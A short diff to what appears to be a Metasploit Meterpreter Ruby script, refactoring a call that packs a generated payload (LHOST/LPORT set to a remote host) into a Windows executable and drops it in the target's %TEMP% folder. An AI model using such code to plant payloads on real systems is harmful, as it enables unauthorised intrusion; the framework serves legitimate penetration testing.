@@ -113,7 +113,10 @@ if not cmd and not upload_fn
 	pay.datastore['LHOST'] = rhost
 	pay.datastore['LPORT'] = rport
 	raw  = pay.generate
-	exe = Msf::Util::EXE.to_win32pe(client.framework, raw)
+	exe = Msf::Util::EXE.to_win32pe(
+      code: raw,
+      framework: client.framework
+  )
 	#and placing it on the target in %TEMP%
 	tempdir = client.fs.file.expand_path("%TEMP%")
 	tempexename = Rex::Text.rand_text_alpha(rand(8)+6)
